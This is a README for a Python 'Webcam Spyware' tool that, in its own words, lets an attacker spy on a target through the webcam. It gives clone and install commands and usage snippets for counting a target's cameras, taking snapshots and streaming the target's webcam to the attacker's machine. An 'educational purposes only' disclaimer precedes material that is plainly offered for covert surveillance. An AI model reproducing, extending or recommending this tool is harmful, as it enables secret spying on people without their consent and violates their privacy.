# Webcam Spyware

## Disclaimer

This script is for educational purposes only, I don't endorse or promote it's illegal usage

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Languages](#languages)
4. [Installations](#installations)
5. [Usage](#usage)
6. [Run](#run)

## Overview

This script allows an attacker spy on a target through the webcam

## Features

- You can check how many webcam are active on the target's system
- You can take snapshot with the target's webcam
- It streams the target's webcam view to the attacker

## Languages

- Python 3.9.7

## Installations

```shell
git clone https://github.com/favoursyre/webcam-spyware.git && cd webcam-spyware
```

```shell
pip install opencv-python
```

## Usage

To check how many webcams are active on the system

```python
cam = Webcam().camScanner()
```

To take a snapshot using the webcam

```python
camPort = 0
cam = Webcam().snapShot(camPort)
```

To stream the webcam view from the target to the attacker
- On target's system

```python
cam = Webcam().sender()
```

- On attacker's system

```python
host = "target-ip-address"
cam = Webcam().receiver(host)
```

## Run

```shell
python webcam.py
```

To use the streaming function, first run the software on target's system before running on the attacker's system
